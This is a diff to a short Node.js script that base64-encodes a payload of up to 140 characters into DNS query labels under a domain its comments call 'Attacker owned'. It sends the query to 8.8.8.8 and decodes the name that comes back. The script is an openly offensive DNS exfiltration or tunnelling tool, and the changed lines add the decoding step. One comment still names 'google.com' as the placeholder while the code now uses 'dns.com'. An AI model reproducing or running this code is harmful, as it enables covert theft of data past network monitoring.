@@ -3,9 +3,11 @@
 
 const packet = require('dns-packet');
 const dgram  = require('dgram');
-const tld    = 'google.com';                                                                      // Attacker owned TLD. Using 'google.com' as a placeholder
+const base64 = require('base-64');
+const utf8   = require('utf8');
+const tld    = 'dns.com';                                                                      // Attacker owned TLD. Using 'google.com' as a placeholder
 var str = new String();
-var xt_str = new String();
+var str_extract = new String();
 
 if (process.argv.length === 3 && process.argv[2].length <= 140) {                                 // Provide an argument i.e. a payload not more than 140 characters/bytes. Each label in a FQDN can be 63 bytes and a complete FQDN has 256 bytes.
     var input = Buffer.from(process.argv[2]).toString('base64').replace(/=/g, '_');                // Encode to base64, base64 is the closest option when it comes to compliance with the DNS spec
@@ -32,10 +34,10 @@ var buff = packet.encode({
             });
 
 socket.on('message', function(message, rinfo) {
-   console.log(rinfo);                                                                             // Printing response info
-   var xt_hname = packet.decode(message).questions[0].name;
-   xt_str = xt_hname.replace(tld, " ");
-   console.log(xt_str);
+   console.log(rinfo);                                                         // Printing response info
+   var hname_extract = packet.decode(message).questions[0].name;
+   str_extract = Buffer.from(((hname_extract.replace(("." + tld), " ")).replace(/_/g, "=")), 'base64').toString();
+   console.log(str_extract);
 });
 
 socket.send(buff, 0, buff.length, 53, '8.8.8.8');
